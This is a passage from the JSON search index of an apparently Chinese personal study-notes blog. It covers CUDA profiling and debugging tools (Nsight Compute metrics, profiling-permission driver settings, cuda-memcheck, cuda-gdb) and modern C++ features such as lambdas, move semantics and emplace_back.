separated by comma. If no\u00a0--section\u00a0options are given, only the temporary section containing all metrics listed using this option is collected. If\u00a0--section\u00a0options are given in addition to\u00a0--metrics, all metrics from those sections and from\u00a0--metrics\u00a0are collected.</p> <p>nvprof metric \u5728 ncu \u4e2d\u7684\u8868\u793a Nsight Compute CLI :: Nsight Compute Documentation (nvidia.com)</p> <pre><code>|inst_executed|smsp__inst_executed.sum|\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u95ee\u9898","title":"\u95ee\u9898","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#profiling-is-not-supported-on-this-device","title":"Profiling is not supported on this device","text":"<p>Nsight compute \u652f\u6301\u7684 GPU\uff1aRelease Notes :: Nsight Compute Documentation (nvidia.com)</p> <ul> <li>\u4e0d\u652f\u6301 pascal\uff08\u5982 gtx1080\uff09\uff0c\u4ece Volta GV100 \u5f00\u59cb\u652f\u6301</li> </ul> <p></p> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u65e0\u6743\u9650\u4f7f\u7528-metric","title":"\u65e0\u6743\u9650\u4f7f\u7528 metric","text":"<p>\u4fee\u6539/etc/modprobe.d\uff0c\u91cd\u542f\u4fdd\u6301\u4fee\u6539</p> <pre><code>sudo vim /etc/modprobe.d/nvidia_profile.conf\n\noptions nvidia NVreg_RestrictProfilingToAdminUsers=0\n\nupdate-initramfs -u -k all #\u66f4\u65b0initramfs, -k all\u6307\u5b9a\u6240\u6709\u5185\u6838\u7248\u672c\n</code></pre> <p>\u4e0d\u7528\u91cd\u542f\uff0c\u4e34\u65f6\u4fee\u6539\u65b9\u6cd5</p> <pre><code>modprobe -rf nvidia_uvm nvidia_drm nvidia_modeset nvidia-vgpu-vfio nvidia\n\nmodprobe nvidia NVreg_RestrictProfilingToAdminUsers=0\n</code></pre> <p>\u65e0\u6cd5\u79fb\u9664\u65f6\uff0c\u67e5\u770b\u662f\u4ec0\u4e48\u8fdb\u7a0b\u5360\u7528\u4e86 gpu</p> <pre><code>sudo lsof /dev/nvidia*\n</code></pre> <p>\u53ef\u80fd\u9700\u8981\u505c\u6b62 nvidia-persistenced.service \u670d\u52a1</p> <pre><code>sudo systemctl status nvidia-persistenced.service\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#\u8c03\u8bd5\u5de5\u5177","title":"\u8c03\u8bd5\u5de5\u5177","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#cuda-memck","title":"cuda-memck","text":"<p>\u4f7f\u7528 cuda-memcheck \u68c0\u67e5\u7a0b\u5e8f\u662f\u5426\u6709\u975e\u6cd5\u5730\u5740\u8bbf\u95ee\u3002\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u6267\u884c\u53d8\u6162</p> <pre><code>cuda-memcheck prog arg...\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#cuda-gdb-\u8c03\u8bd5","title":"cuda-gdb \u8c03\u8bd5","text":"<pre><code>nvcc -g -G XXX.cu -o XXX # -g\u5bf9\u4e8ecpu, -G\u5bf9\u4e8eGPU\n</code></pre> <p>cuda-gdb \u548c gdb \u4f7f\u7528\u7c7b\u4f3c\u3002</p> <p>cuda \u7a0b\u5e8f\u5982\u679c\u4ee3\u7801\u5199\u9519\uff0c\u6267\u884c\u65f6\u53ea\u80fd\u4ece\u5185\u6838\u65e5\u5fd7\u4e2d\u770b\u5230\u62a5\u9519\u4fe1\u606f\uff08\u5982 Xid \u62a5\u9519\uff09\uff0c\u975e\u5e38\u4e0d\u4fbf\u3002</p> <p>\u800c\u4f7f\u7528 cuda-gdb \u53ef\u4ee5\u76f4\u63a5\u5b9a\u4f4d\u54ea\u51fa\u4ee3\u7801\u8bbf\u5b58\u9519\u8bef\uff1a</p> <pre><code>(cuda-gdb) r 10 10 10                                                                                CUDA Exception: Warp Illegal Address                                                                 The exception was triggered at PC 0x55555617ff10 (GEMM.cu:82)\n\nThread 1 \"GEMM\" received signal CUDA_EXCEPTION_14, Warp Illegal Address.\n[Switching focus to CUDA kernel 0, grid 4, block (0,0,0), thread (0,6,0), device 0, sm 0, warp 6, lane 0] 0x000055555617ff20 in gemm_block_shared&lt;32, 32, 8&gt;&lt;&lt;&lt;(32,32,1),(32,32,1)&gt;&gt;&gt; (A=0x7fffbda00000, B=0x7fffd7800000, C=0x7fffd7c00000, m=1024, k=1024, n=1024) at GEMM.cu:82\n82                  Bs[ty][tx] = B(iter * bm + ty, bx * bk + tx); //(tx, ty) in block B(iter, bx)\n(cuda-gdb) quit\nA debugging session is active.\n        Inferior 1 [process 32589] will be killed.\nQuit anyway? (y or n) y\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#nvbit","title":"NVbit","text":"<pre><code>unsigned int __ballot(int predicate); #\n</code></pre> <ul> <li>If\u00a0<code>predicate</code>\u00a0is nonzero,\u00a0<code>__ballot</code>\u00a0returns a value with the\u00a0<code>N</code>th bit set, where\u00a0<code>N</code>\u00a0is the thread index.</li> </ul> <pre><code>int atomicOr(int* address, int val);\n</code></pre>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#warp-level-\u6307\u4ee4","title":"warp-level \u6307\u4ee4","text":"<p>CSE 599 I Accelerated Computing - Programming GPUs Lecture 18.pdf (tschmidt23.github.io)</p> <p></p> <p></p> <p></p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/16/2023-04-16-CUDA%E7%BC%96%E7%A8%8B%26%E5%B7%A5%E5%85%B7/#cuda-sdk","title":"cuda SDK","text":"<ul> <li>HPC SDK NVIDIA HPC SDK | NVIDIA NGC Release Notes Version 23.3 (nvidia.com)</li> </ul> <ul> <li>HPC benchmark NVIDIA HPC-Benchmarks | NVIDIA NGC</li> </ul>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/","title":"C&C++","text":"<ul> <li>C++ \u8bed\u8a00\u65b0\u673a\u5236\uff08\u5982\u95ed\u5305\uff0cfor_each\uff09</li> <li>C++ STL \u4f7f\u7528<ul> <li>\u5bb9\u5668</li> <li>\u7b97\u6cd5\u5e93</li> </ul> </li> <li>\u5e38\u89c1\u7b97\u6cd5\u8bb0\u5f55</li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u73b0\u4ee3-c-\u6559\u7a0b","title":"\u73b0\u4ee3 c++ \u6559\u7a0b","text":"<p>[\u73b0\u4ee3 C++ \u6559\u7a0b\uff1a\u9ad8\u901f\u4e0a\u624b C++ 11/14/17/20 - Modern C++ Tutorial: C++ 11/14/17/20 On the Fly (changkun.de)</p> <p>\u5728\u4f20\u7edf C++ \u4e2d\uff0c\u4e0d\u540c\u7684\u5bf9\u8c61\u6709\u7740\u4e0d\u540c\u7684\u521d\u59cb\u5316\u65b9\u6cd5\uff0c\u4f8b\u5982\u666e\u901a\u6570\u7ec4\u3001POD\uff08Plain\u00a0Old\u00a0Data\uff0c\u5373\u6ca1\u6709\u6784\u9020\u3001\u6790\u6784\u548c\u865a\u51fd\u6570\u7684\u7c7b\u6216\u7ed3\u6784\u4f53\uff09\u7c7b\u578b\u90fd\u53ef\u4ee5\u4f7f\u7528\u00a0<code>{}</code>\u00a0\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u6240\u8bf4\u7684\u521d\u59cb\u5316\u5217\u8868\u3002\u800c\u5bf9\u4e8e\u7c7b\u5bf9\u8c61\u7684\u521d\u59cb\u5316\uff0c\u8981\u4e48\u9700\u8981\u901a\u8fc7\u62f7\u8d1d\u6784\u9020\u3001\u8981\u4e48\u5c31\u9700\u8981\u4f7f\u7528\u00a0<code>()</code>\u00a0\u8fdb\u884c\u3002</p> <p>\u5176\u6b21\uff0cC++11 \u8fd8\u63d0\u4f9b\u4e86\u7edf\u4e00\u7684\u8bed\u6cd5\u6765\u521d\u59cb\u5316\u4efb\u610f\u7684\u5bf9\u8c61\uff0c\u4f8b\u5982\uff1a</p> <pre><code>Foo foo2 {3, 4};\n</code></pre> <p>decltype</p> <p>\u533a\u95f4 for \u8fed\u4ee3</p> <pre><code>    for (auto &amp;element : vec) {  \n        element += 1;                      // writeable  \n    }  \n    for (auto element : vec)  \n        std::cout &lt;&lt; element &lt;&lt; std::endl; // read only\n</code></pre> <p>using \u51fd\u6570\u6307\u9488\u683c\u5f0f\u66f4\u7b80\u5355</p> <pre><code>typedef int (*process)(void *);  \nusing NewProcess = int(*)(void *);\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#c-\u8bed\u8a00\u65b0\u7279\u6027","title":"C++ \u8bed\u8a00\u65b0\u7279\u6027","text":"<p>\u9ed8\u8ba4\u4e3a c++11\uff0c\u5176\u5b83\u6807\u51c6\u7279\u6027\u4f1a\u663e\u793a\u8bf4\u660e\u3002</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#tamplate","title":"tamplate","text":"<p>\u7528\u4e8e\u8868\u793a\u4e00\u822c\u7c7b\u578b\u7684\u51fd\u6570\uff0c\u7c7b\u3002\u7f16\u8bd1\u65f6\u6839\u636e\u9700\u8981\u751f\u6210\u5bf9\u5e94\u7c7b\u578b\u7684\u5b9e\u4f8b\u3002</p> <ul> <li>\u51fd\u6570\u6a21\u677f</li> <li>\u7c7b\u6a21\u677f</li> </ul> <pre><code>template &lt;class identifier&gt; function_declaration;  \ntemplate &lt;typename identifier&gt; function_declaration;\n</code></pre> <p><code>class</code>\u548c<code>typename</code>\u6548\u679c\u662f\u5b8c\u5168\u4e00\u6837\u7684\u3002</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u7c7b\u578b\u8f6c\u6362-cast","title":"\u7c7b\u578b\u8f6c\u6362 cast","text":"<ul> <li>C \u8bed\u8a00\u98ce\u683c\u7684\u7c7b\u578b\u8f6c\u6362\u88ab\u5f03\u7528\uff08\u5373\u5728\u53d8\u91cf\u524d\u4f7f\u7528\u00a0<code>(convert_type)</code>\uff09\uff0c\u5e94\u8be5\u4f7f\u7528\u00a0<code>static_cast</code>\u3001<code>reinterpret_cast</code>\u3001<code>const_cast</code>\u00a0\u6765\u8fdb\u884c\u7c7b\u578b\u8f6c\u6362\u3002`**</li> </ul> <pre><code>int * i_p = static_cast&lt;int *&gt;(p);\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#lambda-\u8868\u8fbe\u5f0f","title":"lambda \u8868\u8fbe\u5f0f","text":"<ul> <li>lambda = \u533f\u540d\u51fd\u6570</li> <li>\u95ed\u5305 = \u6355\u83b7\u4e86 local scope \u5916\u53d8\u91cf\u7684 lambda \u51fd\u6570</li> </ul> <p>Lambda expressions (since C++11) - cppreference.com</p> <pre><code>[\u6355\u83b7\u5217\u8868](\u53c2\u6570\u5217\u8868) mutable(\u53ef\u9009) \u5f02\u5e38\u5c5e\u6027 -&gt; \u8fd4\u56de\u7c7b\u578b {  \n// \u51fd\u6570\u4f53  \n}\n</code></pre> <p>\u9690\u5f0f\u6355\u83b7</p> <ul> <li><code>[]</code>\u7a7a\u6355\u83b7\u5217\u8868</li> <li><code>[name1, name2, ...]</code>\u6355\u83b7\u4e00\u7cfb\u5217\u53d8\u91cf</li> <li><code>[&amp;]</code>\u5f15\u7528\u6355\u83b7\uff0c\u8ba9\u7f16\u8bd1\u5668\u81ea\u884c\u63a8\u5bfc\u5f15\u7528\u5217\u8868</li> <li><code>[=]</code>\u503c\u6355\u83b7\uff0c\u8ba9\u7f16\u8bd1\u5668\u81ea\u884c\u63a8\u5bfc\u503c\u6355\u83b7\u5217\u8868 \u8868\u8fbe\u5f0f\u6355\u83b7</li> </ul> <p>\u4e0a\u9762\u63d0\u5230\u7684\u503c\u6355\u83b7\u3001\u5f15\u7528\u6355\u83b7\u90fd\u662f\u5df2\u7ecf\u5728\u5916\u5c42\u4f5c\u7528\u57df\u58f0\u660e\u7684\u53d8\u91cf\uff0c\u56e0\u6b64\u8fd9\u4e9b\u6355\u83b7\u65b9\u5f0f\u6355\u83b7\u7684\u5747\u4e3a\u5de6\u503c\uff0c\u800c\u4e0d\u80fd\u6355\u83b7\u53f3\u503c\u3002</p> <pre><code>#include &lt;iostream&gt;  \n#include &lt;memory&gt;  // std::make_unique  \n#include &lt;utility&gt; // std::move  \n\nvoid lambda_expression_capture() {  \n    auto important = std::make_unique&lt;int&gt;(1);  \n    auto add = [v1 = 1, v2 = std::move(important)](int x, int y) -&gt; int {  \n        return x+y+v1+(*v2);  \n    };  \n    std::cout &lt;&lt; add(3,4) &lt;&lt; std::endl;  \n}\n</code></pre> <p>\u6cdb\u578b lambda</p> <pre><code>auto add = [](auto x, auto y) {  \n    return x+y;  \n};  \n\nadd(1, 2);  \nadd(1.1, 2.2);\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u9012\u5f52","title":"\u9012\u5f52","text":"<ul> <li>\u5fc5\u987b[&amp;]\uff0c\u56e0\u4e3a\u51fd\u6570\u5b9a\u4e49\u5728\u51fd\u6570\u4f53\u5916\uff0c\u9700\u8981\u4f7f\u7528\u95ed\u5305\u6293\u53d6\u3002</li> <li>\u4e0d\u80fd\u4f7f\u7528 auto\uff0c\u9700\u8981\u4f7f\u7528 function \u5b9a\u4e49\u3002\u56e0\u4e3a auto \u9700\u8981\u6839\u636e\u51fd\u6570\u5185\u5bb9\u63a8\u65ad\uff0c\u800c\u95ed\u5305\u53c8\u9700\u8981\u5f15\u7528\u5916\u90e8\u51fd\u6570\u5b9a\u4e49\u3002</li> </ul> <pre><code>#include &lt;functional&gt;\n// Function &lt; return type (parameter types) &gt; functionName\n\nfunction&lt;int(int)&gt; f = [&amp;](int i) {\n    if (i == 0)\n        return 1;\n    return f(i - 1) * i;\n}\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u53f3\u503c\u5f15\u7528","title":"\u53f3\u503c\u5f15\u7528","text":"<p>\u4f20\u7edf C++ \u901a\u8fc7\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u548c\u8d4b\u503c\u64cd\u4f5c\u7b26\u4e3a\u7c7b\u5bf9\u8c61\u8bbe\u8ba1\u4e86\u62f7\u8d1d/\u590d\u5236\u7684\u6982\u5ff5\uff0c\u4f46\u4e3a\u4e86\u5b9e\u73b0\u5bf9\u8d44\u6e90\u7684\u79fb\u52a8\u64cd\u4f5c\uff0c\u8c03\u7528\u8005\u5fc5\u987b\u4f7f\u7528\u5148\u590d\u5236\u3001\u518d\u6790\u6784\u7684\u65b9\u5f0f\uff0c\u5426\u5219\u5c31\u9700\u8981\u81ea\u5df1\u5b9e\u73b0\u79fb\u52a8\u5bf9\u8c61\u7684\u63a5\u53e3\u3002\u8bd5\u60f3\uff0c\u642c\u5bb6\u7684\u65f6\u5019\u662f\u628a\u5bb6\u91cc\u7684\u4e1c\u897f\u76f4\u63a5\u642c\u5230\u65b0\u5bb6\u53bb\uff0c\u800c\u4e0d\u662f\u5c06\u6240\u6709\u4e1c\u897f\u590d\u5236\u4e00\u4efd\uff08\u91cd\u4e70\uff09\u518d\u653e\u5230\u65b0\u5bb6\u3001\u518d\u628a\u539f\u6765\u7684\u4e1c\u897f\u5168\u90e8\u6254\u6389\uff08\u9500\u6bc1\uff09\uff0c\u8fd9\u662f\u975e\u5e38\u53cd\u4eba\u7c7b\u7684\u4e00\u4ef6\u4e8b\u60c5\u3002</p> <p>\u4f20\u7edf\u7684 C++ \u6ca1\u6709\u533a\u5206\u300e\u79fb\u52a8\u300f\u548c\u300e\u62f7\u8d1d\u300f\u7684\u6982\u5ff5\uff0c\u9020\u6210\u4e86\u5927\u91cf\u7684\u6570\u636e\u62f7\u8d1d\uff0c\u6d6a\u8d39\u65f6\u95f4\u548c\u7a7a\u95f4\u3002\u53f3\u503c\u5f15\u7528\u7684\u51fa\u73b0\u6070\u597d\u5c31\u89e3\u51b3\u4e86\u8fd9\u4e24\u4e2a\u6982\u5ff5\u7684\u6df7\u6dc6\u95ee\u9898\uff0c\u4f8b\u5982\uff1a</p> <pre><code>#include &lt;iostream&gt;  \nclass A {  \npublic:  \n    int *pointer;  \n    A():pointer(new int(1)) {  \n        std::cout &lt;&lt; \"\u6784\u9020\" &lt;&lt; pointer &lt;&lt; std::endl;  \n    }  \n    A(A&amp; a):pointer(new int(*a.pointer)) {  \n        std::cout &lt;&lt; \"\u62f7\u8d1d\" &lt;&lt; pointer &lt;&lt; std::endl;  \n    } // \u65e0\u610f\u4e49\u7684\u5bf9\u8c61\u62f7\u8d1d  \n    A(A&amp;&amp; a):pointer(a.pointer) {  \n        a.pointer = nullptr;  \n        std::cout &lt;&lt; \"\u79fb\u52a8\" &lt;&lt; pointer &lt;&lt; std::endl;  \n    }  \n    ~A(){  \n        std::cout &lt;&lt; \"\u6790\u6784\" &lt;&lt; pointer &lt;&lt; std::endl;  \n        delete pointer;  \n    }  \n};  \n// \u9632\u6b62\u7f16\u8bd1\u5668\u4f18\u5316  \nA return_rvalue(bool test) {  \n    A a,b;  \n    if(test) return a; // \u7b49\u4ef7\u4e8e static_cast&lt;A&amp;&amp;&gt;(a);  \n    else return b;     // \u7b49\u4ef7\u4e8e static_cast&lt;A&amp;&amp;&gt;(b);  \n}  \nint main() {  \n    A obj = return_rvalue(false);  \n    std::cout &lt;&lt; \"obj:\" &lt;&lt; std::endl;  \n    std::cout &lt;&lt; obj.pointer &lt;&lt; std::endl;  \n    std::cout &lt;&lt; *obj.pointer &lt;&lt; std::endl;  \n    return 0;  \n}\n</code></pre> <ol> <li>\u9996\u5148\u4f1a\u5728\u00a0<code>return_rvalue</code>\u00a0\u5185\u90e8\u6784\u9020\u4e24\u4e2a\u00a0<code>A</code>\u00a0\u5bf9\u8c61\uff0c\u4e8e\u662f\u83b7\u5f97\u4e24\u4e2a\u6784\u9020\u51fd\u6570\u7684\u8f93\u51fa\uff1b</li> <li>\u51fd\u6570\u8fd4\u56de\u540e\uff0c\u4ea7\u751f\u4e00\u4e2a\u5c06\u4ea1\u503c\uff0c\u88ab\u00a0<code>A</code>\u00a0\u7684\u79fb\u52a8\u6784\u9020\uff08<code>A(A&amp;&amp;)</code>\uff09\u5f15\u7528\uff0c\u4ece\u800c\u5ef6\u957f\u751f\u547d\u5468\u671f\uff0c\u5e76\u5c06\u8fd9\u4e2a\u53f3\u503c\u4e2d\u7684\u6307\u9488\u62ff\u5230\uff0c\u4fdd\u5b58\u5230\u4e86\u00a0<code>obj</code>\u00a0\u4e2d\uff0c\u800c\u5c06\u4ea1\u503c\u7684\u6307\u9488\u88ab\u8bbe\u7f6e\u4e3a\u00a0<code>nullptr</code>\uff0c\u9632\u6b62\u4e86\u8fd9\u5757\u5185\u5b58\u533a\u57df\u88ab\u9500\u6bc1\u3002</li> </ol> <pre><code>#include &lt;iostream&gt; // std::cout  \n#include &lt;utility&gt; // std::move  \n#include &lt;vector&gt; // std::vector  \n#include &lt;string&gt; // std::string  \n\nint main() {  \n\n    std::string str = \"Hello world.\";  \n    std::vector&lt;std::string&gt; v;  \n\n    // \u5c06\u4f7f\u7528 push_back(const T&amp;), \u5373\u4ea7\u751f\u62f7\u8d1d\u884c\u4e3a  \n    v.push_back(str);  \n    // \u5c06\u8f93\u51fa \"str: Hello world.\"  \n    std::cout &lt;&lt; \"str: \" &lt;&lt; str &lt;&lt; std::endl;  \n\n    // \u5c06\u4f7f\u7528 push_back(const T&amp;&amp;), \u4e0d\u4f1a\u51fa\u73b0\u62f7\u8d1d\u884c\u4e3a  \n    // \u800c\u6574\u4e2a\u5b57\u7b26\u4e32\u4f1a\u88ab\u79fb\u52a8\u5230 vector \u4e2d\uff0c\u6240\u4ee5\u6709\u65f6\u5019 std::move \u4f1a\u7528\u6765\u51cf\u5c11\u62f7\u8d1d\u51fa\u73b0\u7684\u5f00\u9500  \n    // \u8fd9\u6b65\u64cd\u4f5c\u540e\uff0cstr \u4e2d\u7684\u503c\u4f1a\u53d8\u4e3a\u7a7a  \n    v.push_back(std::move(str));  \n    // \u5c06\u8f93\u51fa \"str: \"  \n    std::cout &lt;&lt; \"str: \" &lt;&lt; str &lt;&lt; std::endl;  \n\n    return 0;  \n}\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5c0f\u6280\u5de7","title":"\u5c0f\u6280\u5de7","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#pair-\u89e3\u5305","title":"pair \u89e3\u5305","text":"<p>\u9700\u8981 c++17</p> <pre><code>queue&lt;pair&lt;int, int&gt;&gt; q;\nauto [tmp_id, val] = q.front();\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u591a\u5143-swap","title":"\u591a\u5143 swap","text":"<p>48. \u65cb\u8f6c\u56fe\u50cf - \u529b\u6263\uff08LeetCode\uff09</p> <ul> <li>\u5c06 4 \u4e2a\u5143\u7d20\u5faa\u73af\u5de6\u79fb</li> </ul> <pre><code>tie(matrix[i][j], matrix[n - j - 1][i], matrix[n - i - 1][n - j - 1], matrix[j][n - i - 1]) \\\n                    = make_tuple(matrix[n - j - 1][i], matrix[n - i - 1][n - j - 1], matrix[j][n - i - 1], matrix[i][j]);\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#string_view","title":"string_view","text":"<ul> <li>c++17</li> </ul> <p>\u907f\u514d\u4e86 string \u7684\u590d\u5236</p> <pre><code>if(string_view{s.data() + pos, len} == \"abc\")\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u95ee\u9898","title":"\u95ee\u9898","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#emplace_back-push_back","title":"emplace_back, push_back","text":"<p>c++ - emplace_back() vs push_back when inserting a pair into std::vector - Stack Overflow</p> <pre><code>vector&lt;pair&lt;int, int&gt;&gt; ans;\n\nans.push_back({prime, cnt});   //\u6b63\u786e\nans.emplace_back({prime, cnt}); //\u9519\u8bef\n</code></pre> <p>emplace \u88ab\u8bbe\u8ba1\u7528\u6765\u907f\u514d\u6784\u5efa\u4e34\u65f6\u53d8\u91cf\uff0c\u7136\u540e\u62f7\u8d1d\u590d\u5236\u3002\u63a5\u6536\u7684\u662f\u6784\u9020\u51fd\u6570\u53c2\u6570</p> <pre><code>template&lt; class... Args &gt;\nreference emplace_back( Args&amp;&amp;... args );\n</code></pre> <p>\u56e0\u6b64\u6539\u6210\u8fd9\u6837\u662f\u6b63\u786e\u7684</p> <pre><code>ans.emplace_back(prime, cnt);\n\nans.emplace_back(make_pair(prime, cnt)) //\u8fd9\u6837\u5199\u867d\u7136\u7ed3\u679c\u6b63\u786e\uff0c\u4f46\u662f emplace \u5c31\u6ca1\u6709\u610f\u4e49\u4e86\uff0c\u56e0\u4e3a\u5df2\u7ecf\u663e\u793a\u6784\u5efa\u4e86\u4e34\u65f6\u53d8\u91cf\n</code></pre> <p>\u53e6\u5916<code>{1, 2}</code>\u4e0d\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u5177\u4f53\u542b\u4e49\u548c\u573a\u666f\u6709\u5173\u3002</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#emplace-\u4e00\u4e2a\u590d\u6742\u5bf9\u8c61","title":"emplace \u4e00\u4e2a\u590d\u6742\u5bf9\u8c61","text":"<p>c++ - how to use std::vector::emplace_back for vector&lt;vector? - Stack Overflow</p> <p>\u89e3\u6cd5\u4e00\uff1a</p> <pre><code>res.emplace_back(std::initializer_list&lt;int&gt;{1,2});\n</code></pre> <p>\u89e3\u6cd5\u4e8c\uff1a\u4f7f\u7528 move</p> <pre><code>for (int i = 0; i &lt; 10000; ++i) {\n    std::vector&lt;int&gt; v(10000, 0);  // will become empty afterward\n    res.emplace_back(std::move(v));  // can be replaced by \n                                     // res.push_back(std::move(v));\n}\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u521d\u59cb\u5316-pair-array","title":"\u521d\u59cb\u5316 pair array","text":"<p>initialization - C++: array&lt;&gt; too many initializers - Stack Overflow</p> <pre><code>array&lt;pair&lt;int, int&gt;, 8&gt; direction = {{{-1, -1}, {-1, 0}, {-1, 1}, {0, -1}, {0, 1}, {1, -1}, {1, 0}, {1, 1}}}; #\u9700\u8981\u591a\u4e00\u5c42{}\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#c-\u6709\u70b9\u70e6\u4eba\u7684\u5730\u65b9","title":"C \u6709\u70b9\u70e6\u4eba\u7684\u5730\u65b9","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u9690\u5f0f\u7c7b\u578b\u8f6c\u6362","title":"\u9690\u5f0f\u7c7b\u578b\u8f6c\u6362","text":"<p>\u9690\u5f0f\u8f6c\u6362\u89c4\u5219</p> <ul> <li>\u6ce8\u610f\uff1aint -&gt; unsigned </li> </ul> <p><code>m*n</code>\u76f4\u63a5\u4e58\u4f1a\u6ea2\u51fa \u76f4\u63a5<code>min</code>\u53c8\u4f1a\u51fa\u73b0\u4e24\u8fb9\u53c2\u6570\u7c7b\u578b\u4e0d\u4e00\u6837\u7684\u95ee\u9898</p> <pre><code>int m = 99998, n = 99999;\nint k = 3;\nk = min((long long)k, (long long)m*n);\n</code></pre> <pre><code>unsigned int i = 3;\ncout &lt;&lt; i*-1 &lt;&lt;endl;   # -1\u88ab\u8f6c\u6362\u6210\ncout &lt;&lt; (int)i*-1 &lt;&lt;endl;\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-C%26C%2B%2B/#struct-\u521d\u59cb\u5316","title":"struct \u521d\u59cb\u5316","text":"<p>c \u4e2d\u9700\u8981<code>typedef struct aaa{} bbb;</code></p> <ul> <li><code>struct aaa var</code>\u6216\u8005<code>bbb var;</code></li> </ul> <p>C++ \u4e2d</p> <ul> <li>\u53ef\u4ee5\u5b9a\u4e49\u6784\u9020\u51fd\u6570</li> <li>\u53ef\u4ee5\u76f4\u63a5\u521d\u59cb\u5316\u53d8\u91cf</li> <li>struct aaa \u540e\u53ef\u4ee5\u76f4\u63a5 aaa \u5b9a\u4e49\u53d8\u91cf</li> </ul> <p>\u5b9a\u4e49\u6784\u9020\u51fd\u6570\uff0cnew \u65f6\u901a\u8fc7\u5706\u62ec\u53f7\u5b9e\u4f8b\u5316</p> <pre><code>struct ListNode\n{\n    double value;\n    ListNode *next;\n    //\u6784\u9020\u51fd\u6570\n    ListNode(double valuel, ListNode *nextl = nullptr)\n    {\n        value = 